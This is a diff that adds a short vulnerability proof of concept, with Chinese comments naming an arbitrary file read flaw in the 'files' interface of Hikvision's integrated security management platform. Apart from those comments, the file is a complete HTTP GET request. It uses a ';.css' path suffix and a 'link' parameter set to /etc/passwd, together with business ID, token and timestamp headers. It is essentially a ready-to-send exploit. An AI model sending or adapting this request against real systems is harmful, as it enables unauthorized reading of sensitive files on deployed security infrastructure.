@@ -1,0 +1,10 @@
+# HIKVISION综合安防管理平台files文件读取漏洞
+# 海康威视是以视频为核心的智能物联网解决方案和大数据服务提供商。
+# 综合安防管理平台 files接口存在任意文件读取漏洞，攻击者可以读取系统任意敏感文件
+GET /lm/api/files;.css?acid=80051722&link=%2Fetc%2Fpasswd&bid=hd_tag_m8mv260f HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv260f
+RM-PRO-Token: 31cc885e4d0cba4d184eb612c3761c99
+RM-PRO-Time: 1742808519831
+User-Agent: curl/7.83.1
+
